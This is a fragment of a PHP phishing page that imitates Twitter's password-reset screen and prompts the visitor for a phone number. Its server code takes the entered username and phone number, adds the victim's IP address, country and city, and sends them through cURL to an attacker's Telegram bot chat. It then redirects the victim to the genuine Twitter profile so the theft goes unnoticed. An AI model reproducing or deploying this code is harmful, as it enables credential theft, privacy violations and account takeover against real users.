...
$parametre= array(
'chat_id' => "1764463552",
'text' => "Twitter fc - $username telefon numarası sayfasında.",
);
$ch = curl_init();
...
$parametre= array(
'chat_id' => "1764463552",
'text' => "Twitter fc -Kullanıcı Adı: $username - Telefon Numarası: $password - Ip Adresi: $ip - Ülke: $ulke - Şehir: $sehir",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
...
echo '';
   ...
   header("Location: https://twitter.com/$username");
}
?>
 ...
 <option value="/account/reset_password?lang=ko">한국어</option>
  ...
  <div class="user-name-box">
    ...
    <div class="screenname" dir="ltr">@<?php echo $username; ?></div>
      ...
      <p>
      Please enter phone number. <a href="https://support.twitter.com/articles/76036-keeping-your-account-secure?ref=password_reset" target="_blank">Learn more</a>
      </p>
      <form class="Form" method="post">
        <input type="hidden" name="authenticity_token">
        <label for="password">Phone Number</label>
        <div class="PasswordStrength">
          <input id="password" class="Form-textbox Edge-textbox is-required" type="number" name="password">
